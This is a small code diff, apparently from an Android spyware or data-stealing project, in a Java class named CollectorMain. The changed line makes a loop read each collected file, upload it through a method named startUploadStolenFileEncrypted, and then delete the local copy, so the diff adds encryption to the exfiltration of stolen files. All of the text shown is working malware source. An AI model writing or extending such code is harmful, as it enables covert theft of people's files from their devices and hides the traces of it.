@@ -50,7 +50,7 @@ public class CollectorMain extends ContextWrapper implements Runnable
 		for(String filename:files){
 			System.out.println(filename);
 			try {
-				copyAndClose(sb.readFile(filename), fu.startUploadStolenFile(filename));
+				copyAndClose(sb.readFile(filename), fu.startUploadStolenFileEncrypted(filename));
 				sb.deleteFile(filename);
 			} catch (Throwable e) {
 				e.printStackTrace();
